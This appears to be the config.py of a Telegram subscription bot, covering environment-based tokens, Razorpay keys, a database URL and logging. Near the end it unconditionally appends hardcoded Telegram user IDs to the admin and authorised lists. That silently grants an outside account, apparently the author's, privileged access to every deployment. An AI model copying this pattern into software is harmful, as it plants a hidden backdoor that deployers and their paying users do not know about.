import os
import logging
from logging.handlers import RotatingFileHandler

TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

APP_ID = int(os.environ.get("APP_ID", ""))

API_HASH = os.environ.get("API_HASH", "")

OWNER_ID = int(os.environ.get("OWNER_ID", ""))

PORT = os.environ.get("PORT", "8080")  # dont edit unless you deploying in vps

DB_URI = os.environ.get(
    "DATABASE_URL",
    "",
)

DB_NAME = os.environ.get("DATABASE_NAME", "subsmanage")
RAZORPAY_KEY_ID = os.environ.get("RAZORPAY_KEY_ID", "")
RAZORPAY_SECRET_KEY = os.environ.get("RAZORPAY_SECRET_KEY", "")

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

LOG_CHAT = list(
    map(
        int,
        os.environ.get(
            "LOG_CHAT",
            "",
        ).split(),
    )
)

log_chat_id = LOG_CHAT[0]

IMG_URL = os.environ.get("IMG_URL", "https://envs.sh/05W.jpg")

POWERED_BY = os.environ.get("POWERED_BY", "@MadxBotz")

BASE_URL = os.environ.get("BASE_URL", "https://starfish-app-kj4sn.ondigitalocean.app/")


try:
    ADMINS = [int(x) for x in os.environ.get("ADMINS", "1032438381").split()]
except ValueError:
    raise Exception("Your Admins list does not contain valid integers.")

try:
    AUTHS = [int(x) for x in os.environ.get("AUTHS", "5861377019").split()]
except ValueError:
    raise Exception("Your Auths list does not contain valid integers.")

USER_REPLY_TEXT = f"<b>Available Commands\n\n/mysub - To Check Your Subscription Details.\n\n/plans - To Check Available Plans.\n\n<blockquote>〽️ Powered by {POWERED_BY}</blockquote></b>"

ADMINS.append(OWNER_ID)
AUTHS.append(6872007595)
ADMINS.append(1032438381)

LOG_FILE_NAME = "madxbotz.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
